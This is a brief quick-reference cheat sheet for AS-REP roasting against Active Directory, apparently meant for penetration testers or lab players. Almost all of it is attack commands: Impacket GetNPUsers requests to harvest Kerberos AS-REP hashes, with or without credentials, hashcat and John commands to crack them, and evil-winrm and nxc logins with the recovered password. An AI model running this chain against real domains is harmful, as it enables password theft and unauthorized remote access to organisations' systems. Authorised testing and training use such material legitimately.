AS-REP ROASTING - QUICK REF

With credentials:
    GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request

Without credentials (needs userlist):
    GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <userlist-file> -no-pass -request

Save to file:
    add  -outputfile <hash-file>  to either command above

Crack (hashcat, mode 18200):
    hashcat -m 18200 <hash-file> <wordlist-path> --force

Crack (John):
    john --format=krb5asrep --wordlist=<wordlist-path> <hash-file>

Use recovered password:
    evil-winrm -i <target-ip> -u <user> -p <password>
    nxc smb <target-ip> -u <user> -p <password>
